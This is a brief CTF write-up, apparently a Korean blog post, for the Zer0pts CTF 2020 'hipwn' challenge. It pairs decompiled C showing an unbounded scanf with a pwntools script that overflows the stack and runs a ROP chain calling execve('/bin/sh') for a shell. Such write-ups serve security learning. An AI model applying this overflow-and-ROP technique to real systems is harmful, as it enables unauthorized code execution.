---
title: "2020 Zer0pts CTF hipwn"
date: 2020-3-20
ctf: Zer0pts CTF
layout: post
published : false
---

```c
__int64 sub_400160()
{
  __int64 v1; // [rsp+0h] [rbp-108h]

  sub_40062F("What's your team name?");
  scanf(&v1);
  printf("Hi, %s. Welcome to zer0pts CTF 2020!\n", &v1);
  return 0LL;
}
```

e.bss() + 0x300에 /bin/sh 쓰고 execve로 실행해주면 된다.

> exploit.py

```python
from pwn import *

e = ELF('./chall')
# p = remote('13.231.207.73',9010)
p = process('./chall')

prax = 0x0000000000400121 # pop rax ; ret
prdi = 0x000000000040141c # pop rdi ; ret
prsi_r15 = 0x000000000040141a # pop rsi ; pop r15 ; ret
prdx = 0x004023f5 # pop rdx ; ret
syscall = 0x00402a72 # syscall ; ret
scanf = 0x00000000004004EE

pay = 'A'*0x108
pay += p64(prdi)
pay += p64(e.bss() + 0x300)
pay += p64(scanf)

pay += p64(prax)
pay	+= p64(59)
pay += p64(prdi)
pay += p64(e.bss() + 0x300)
pay += p64(prsi_r15)
pay += p64(0)
pay += p64(0)
pay += p64(prdx)
pay += p64(0)
pay += p64(syscall)

pause()
p.sendlineafter('?',pay)

p.sendline('/bin/sh\x00')

p.interactive()
```

